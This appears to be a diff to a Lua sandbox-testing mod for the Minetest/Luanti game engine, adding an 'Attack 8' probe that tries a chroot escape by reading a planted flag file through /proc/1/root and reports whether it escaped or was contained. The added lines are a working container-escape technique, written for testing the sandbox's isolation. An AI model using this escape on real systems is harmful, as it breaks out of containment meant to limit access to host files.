@@ -235,5 +235,18 @@ print(r == 0 and "ESCAPED" or "CONTAINED")
         return "[ERROR] unexpected luajit output: " .. out:sub(1, 80)
     end)
 
+    -- [Attack 8] Chroot escape via /proc/1/root: the kernel resolves this magic-link
+    -- against PID 1's root dentry, bypassing the chroot boundary entirely.
+    -- Works when there is no PID namespace isolation (PID 1 is the host init).
+    probe("Chroot escape — /proc/1/root flag capture", function()
+        local f = IE.io.open("/proc/1/root/tmp/modbox_flag.txt", "r")
+        if not f then
+            return "[CONTAINED] cannot read host flag via /proc/1/root"
+        end
+        local flag = f:read("*a"):gsub("%s+$", "")
+        f:close()
+        return "[ESCAPED] *** FLAG CAPTURED: " .. flag .. " ***"
+    end)
+
     minetest.log("action", "[EVILMOD] ========== ATTACK ENDED ==========")
 end)
